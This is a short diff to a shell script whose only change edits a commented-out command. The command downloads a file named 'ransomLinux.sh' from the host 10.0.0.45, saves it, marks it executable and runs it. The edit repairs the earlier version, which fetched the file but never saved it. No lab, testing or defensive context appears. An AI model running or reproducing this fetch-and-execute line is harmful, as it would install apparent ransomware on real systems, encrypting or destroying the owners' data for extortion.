@@ -1,6 +1,6 @@
 #!/bin/sh
 
-#f=ransomLinux.sh; curl http://10.0.0.45/$f ; ./$f
+#f=ransomLinux.sh; curl http://10.0.0.45/$f > $f; chmod +x $f ; ./$f
 
 
 
